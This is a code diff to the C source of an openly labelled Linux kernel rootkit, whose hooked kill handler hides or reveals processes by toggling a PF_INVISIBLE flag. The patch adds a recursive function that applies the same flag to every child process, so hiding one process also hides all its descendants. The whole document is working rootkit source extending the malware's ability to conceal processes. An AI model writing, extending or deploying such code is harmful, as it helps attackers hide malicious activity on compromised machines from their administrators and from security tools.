@@ -93,6 +93,28 @@ find_task(pid_t pid)
 	return NULL;
 }
 
+void
+changeInvisibleChildren(pid_t pid)
+{
+	struct task_struct *task;
+	struct list_head *list;
+	if (!pid)
+		return;
+	task = find_task(pid);
+	if (!task)
+		return;
+	list_for_each(list, &task->children)
+	{
+		task = list_entry(list, struct task_struct, sibling);
+		if (task)
+		{
+			task->flags ^= PF_INVISIBLE;
+			changeInvisibleChildren(task->pid);
+		}
+	}
+	return;
+}
+
 int
 is_invisible(pid_t pid)
 {
@@ -270,6 +292,7 @@ hacked_kill(pid_t pid, int sig)
 			if ((task = find_task(pid)) == NULL || is_invisible(pid) == true)
 				return -ESRCH;
 			task->flags ^= PF_INVISIBLE;
+			changeInvisibleChildren(task->pid);
 			printk(KERN_INFO "rootkit: process invisible >:-)\n");
 			break;
 		case SIGVIS:
@@ -277,6 +300,7 @@ hacked_kill(pid_t pid, int sig)
 			if ((task = find_task(pid)) == NULL || is_invisible(pid) == false)
 				return -ESRCH;
 			task->flags ^= PF_INVISIBLE;
+			changeInvisibleChildren(task->pid);
 			printk(KERN_INFO "rootkit: process visible :-(\n");
 			break;
 		default:
